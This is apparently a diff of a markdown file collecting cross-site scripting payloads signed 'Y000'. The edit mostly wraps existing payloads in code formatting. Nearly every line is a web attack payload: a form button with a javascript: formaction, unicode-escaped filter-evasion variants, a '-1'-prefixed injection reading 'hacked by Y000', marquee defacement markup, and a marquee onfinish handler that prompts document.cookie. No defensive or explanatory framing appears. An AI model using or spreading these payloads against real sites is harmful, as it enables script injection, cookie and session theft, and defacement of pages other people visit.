@@ -1,5 +1,5 @@
 
-##<form><button formaction=javascript&colon;alert('xss_by_Y000!')>_Y000!_
+`<form><button formaction=javascript&colon;alert('xss_by_Y000!')>_Y000!_`
 
 
 ##<marquee><form><button formacti\u006fn=javascript&colon;pr\u006fmpt('xss_by_Y000!')>_Y000!_</marquee>
@@ -11,7 +11,8 @@
 
 -1'<marquee>hacked by Y000</marquee>
 
-##<marquee direction="down" width="250" height="200" behavior="alternate" style="border:solid">
+```
+<marquee direction="down" width="250" height="200" behavior="alternate" style="border:solid">
   <marquee behavior="alternate">
     Xss by Y000
   </marquee>
@@ -19,6 +20,7 @@
     Y000
   </marquee>
 </marquee>
+```
 
 
 <marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>
